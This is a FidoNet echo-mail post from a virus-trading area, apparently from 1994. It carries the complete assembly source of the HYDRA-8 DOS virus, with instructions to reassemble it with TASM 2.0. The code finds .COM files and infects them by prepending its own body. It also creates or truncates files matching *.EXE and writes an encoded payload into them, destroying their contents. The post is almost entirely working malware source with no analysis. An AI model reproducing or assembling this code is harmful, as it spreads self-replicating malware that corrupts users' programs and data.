;Ä PVT.VIRII (2:465/65.4) ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ PVT.VIRII Ä
; Msg  : 34 of 54
; From : MeteO                               2:5030/136      Tue 09 Nov 93 09:14
; To   : -  *.*  -                                           Fri 11 Nov 94 08:10
; Subj : HYDRA_8.ASM
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
;.RealName: Max Ivanov
;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ
;* Kicked-up by MeteO (2:5030/136)
;* Area : VIRUS (Int: ˆ­ä®p¬ æ¨ï ® ¢¨pãá å)
;* From : Doug Bryce, 2:283/718 (06 Nov 94 16:59)
;* To   : Brad Frazee
;* Subj : HYDRA_8.ASM
;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ
;@RFC-Path:
;ddt.demos.su!f400.n5020!f3.n5026!f2.n51!f550.n281!f512.n283!f35.n283!f7.n283!f7
;18.n283!not-for-mail
;@RFC-Return-Receipt-To: Doug.Bryce@f718.n283.z2.fidonet.org
PAGE  59,132

;ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ
;ÛÛ                                      ÛÛ
;ÛÛ                             HYDRA8                                   ÛÛ
;ÛÛ                                      ÛÛ
;ÛÛ                                                                      ÛÛ
;ÛÛ  Disassembly by: -=>Wasp<=- aka >>Night Crawler<<                    ÛÛ
;ÛÛ                                                                      ÛÛ
;ÛÛ  Reassemble with TASM 2.0                                            ÛÛ
;ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ

DATA_1E     EQU 80H
DATA_16E    EQU 1EFH
DATA_17E    EQU 1F2H
DATA_18E    EQU 9D9AH

SEG_A       SEGMENT BYTE PUBLIC
        ASSUME  CS:SEG_A, DS:SEG_A


        ORG 100h

HYDRA8      PROC    FAR

START:
        JMP LOC_2           ; (01E2)
        DB   59H, 44H, 00H, 00H
DATA_4      DB  'HyDra-8   Beta - Not For Release'
        DB  '. *.CO?'
        DB  0
DATA_7      DW  0, 84FCH
DATA_9      DW  0
DATA_10     DB  0
        DB  29 DUP (0)
DATA_11     DB  0
        DB  0, 0, 0, 0, 0, 0
DATA_12     DB  0
        DB  0, 0, 0, 0, 0, 0
COPYRIGHT   DB  'Copyright (c)'
        DB  '  1991 by C.A.V.E.  '
DATA_13     DB  2AH
        DB   2EH, 45H, 58H, 45H, 00H
DATA_14     DB  33H
        DB  0C9H, 1EH, 52H,0E8H, 06H, 00H
        DB  0E8H, 13H, 00H,0EBH, 36H, 90H
        DB  0BEH, 48H, 01H,0BFH, 5AH, 01H
        DB  0B9H, 12H, 00H

LOCLOOP_1:
        XOR BYTE PTR [SI],0F5H
        MOVSB               ; Mov [si] to es:[di]
        LOOP    LOCLOOP_1       ; Loop if cx > 0

        RETN
        MOV AX,0F00H
        INT 10H         ; Video display   ah=functn 0Fh
                        ;  get state, al=mode, bh=page
        MOV AH,0
        INT 10H         ; Video display   ah=functn 00h
                        ;  set display mode in al
        MOV AX,200H
        MOV DH,0CH
        MOV DL,1FH
        INT 10H         ; Video display   ah=functn 02h
                        ;  set cursor location in dx
        XOR DX,DX           ; Zero register
        MOV DX,OFFSET DATA_12
        MOV AH,9
        INT 21H         ; DOS Services  ah=function 09h
                        ;  display char string at ds:dx
        MOV AX,200H
        MOV DH,18H
        MOV DL,0
        INT 10H         ; Video display   ah=functn 02h
                        ;  set cursor location in dx
        RETN
        MOV AX,4C00H
        INT 21H         ; DOS Services  ah=function 4Ch
                        ;  terminate with al=return code
        ADD [BP+SI-6563H],AH
        CMC             ; Complement carry
        PUSHF               ; Push flags
        XCHG    DH,CH
        MOV DI,DATA_18E
        DB   9BH,0F5H,0B2H, 94H, 99H, 81H
        DB  0CAH,0D1H
LOC_2:
        PUSH    AX
        MOV AX,CS
        ADD AX,1000H
        XOR DI,DI           ; Zero register
        MOV CX,1EFH
        MOV SI,OFFSET DS:[100H]
        MOV ES,AX
        REP MOVSB           ; Rep when cx >0 Mov [si] to es:[di]
        MOV AH,1AH
        MOV DX,OFFSET DATA_10
        INT 21H         ; DOS Services  ah=function 1Ah
                        ;  set DTA to ds:dx
        MOV AH,4EH          ; 'N'
        MOV DX,OFFSET DATA_4+22H
        INT 21H         ; DOS Services  ah=function 4Eh
                        ;  find 1st filenam match @ds:dx
        JC  LOC_6           ; Jump if carry Set
LOC_3:
        MOV AH,3DH          ; '='
        MOV AL,2
        MOV DX,OFFSET DATA_11
        INT 21H         ; DOS Services  ah=function 3Dh
                        ;  open file, al=mode,name@ds:dx
        MOV BX,AX
        PUSH    ES
        POP DS
        MOV AX,3F00H
        MOV CX,0FFFFH
        MOV DX,DATA_16E
        INT 21H         ; DOS Services  ah=function 3Fh
                        ;  read file, cx=bytes, to ds:dx
        ADD AX,1EFH
        MOV CS:DATA_9,AX
        CMP WORD PTR DS:DATA_17E,4459H
        JNE LOC_4           ; Jump if not equal
        MOV AH,3EH          ; '>'
        INT 21H         ; DOS Services  ah=function 3Eh
                        ;  close file, bx=file handle
        PUSH    CS
        POP DS
        MOV AH,4FH          ; 'O'
        INT 21H         ; DOS Services  ah=function 4Fh
                        ;  find next filename match
        JC  LOC_7           ; Jump if carry Set
        JMP SHORT LOC_3     ; (0204)
LOC_4:
        XOR CX,CX           ; Zero register
        MOV DX,CX
        MOV AX,4200H
        INT 21H         ; DOS Services  ah=function 42h
                        ;  move file ptr, cx,dx=offset
        JC  LOC_5           ; Jump if carry Set
        MOV AH,40H          ; '@'
        XOR DX,DX           ; Zero register
        MOV CX,CS:DATA_9
        INT 21H         ; DOS Services  ah=function 40h
                        ;  write file cx=bytes, to ds:dx
LOC_5:
        MOV AH,3EH          ; '>'
        INT 21H         ; DOS Services  ah=function 3Eh
                        ;  close file, bx=file handle
        PUSH    CS
        POP DS
LOC_6:
        MOV AH,1AH
        MOV DX,DATA_1E
        INT 21H         ; DOS Services  ah=function 1Ah
                        ;  set DTA to ds:dx
        JMP SHORT LOC_10        ; (02B0)
        DB  90H
LOC_7:
        CLC             ; Clear carry flag
        XOR CX,CX           ; Zero register
        PUSH    DS
        PUSH    DX
        MOV AH,1AH
        MOV DX,OFFSET DATA_10
        INT 21H         ; DOS Services  ah=function 1Ah
                        ;  set DTA to ds:dx
        MOV DX,OFFSET DATA_13
        MOV AH,4EH          ; 'N'
        XOR CX,CX           ; Zero register
        INT 21H         ; DOS Services  ah=function 4Eh
                        ;  find 1st filenam match @ds:dx
        JC  LOC_6           ; Jump if carry Set
LOC_8:
        MOV AH,3CH          ; '<'
        XOR CX,CX           ; Zero register
        MOV DX,OFFSET DATA_11
        INT 21H         ; DOS Services  ah=function 3Ch
                        ;  create/truncate file @ ds:dx
        MOV BX,AX
        JC  LOC_6           ; Jump if carry Set
        MOV AX,3D02H
        MOV DX,OFFSET DATA_11
        INT 21H         ; DOS Services  ah=function 3Dh
                        ;  open file, al=mode,name@ds:dx
        MOV BX,AX
        CLC             ; Clear carry flag
        XOR DX,DX           ; Zero register
        MOV AH,40H          ; '@'
        MOV DX,OFFSET DATA_14
        MOV CX,5AH
        INT 21H         ; DOS Services  ah=function 40h
                        ;  write file cx=bytes, to ds:dx
        CMP AX,5AH
        JB  LOC_9           ; Jump if below
        MOV AH,3EH          ; '>'
        INT 21H         ; DOS Services  ah=function 3Eh
                        ;  close file, bx=file handle
        JC  LOC_9           ; Jump if carry Set
        MOV AH,4FH          ; 'O'
        INT 21H         ; DOS Services  ah=function 4Fh
                        ;  find next filename match
        JNC LOC_8           ; Jump if carry=0
LOC_9:
        MOV AX,4C00H
        INT 21H         ; DOS Services  ah=function 4Ch
                        ;  terminate with al=return code
LOC_10:
        XOR DI,DI           ; Zero register
        MOV SI,OFFSET DATA_15
        MOV CX,22H
        REP MOVSB           ; Rep when cx >0 Mov [si] to es:[di]
        POP BX
        MOV CS:DATA_7,0
        MOV WORD PTR CS:DATA_7+2,ES
        POP BX
        JMP DWORD PTR CS:DATA_7
DATA_15     DB  1EH
        DB   07H,0B9H,0FFH,0FFH,0BEH,0EFH
        DB   02H,0BFH, 00H, 01H, 2BH,0CEH
        DB  0F3H,0A4H, 2EH,0C7H, 06H, 00H
        DB   01H, 00H, 01H, 2EH, 8CH, 1EH
        DB   02H, 01H, 8BH,0C3H, 2EH,0FFH
        DB   2EH, 00H, 01H,0CDH
        DB  20H

HYDRA8      ENDP

SEG_A       ENDS



        END START

;-+-  FidoPCB v1.4 [NR]
; + Origin: FidoNet * Mathieu Not‚ris * Brussels-Belgium-Europe (2:283/718)
;=============================================================================
;
;Yoo-hooo-oo, -!
;
;
;    þ The MeÂeO
;
;/L            Specify library search paths
;
;--- Aidstest Null: /Kill
; * Origin: ùPVT.ViRIIúmainúboardú / Virus Research labs. (2:5030/136)

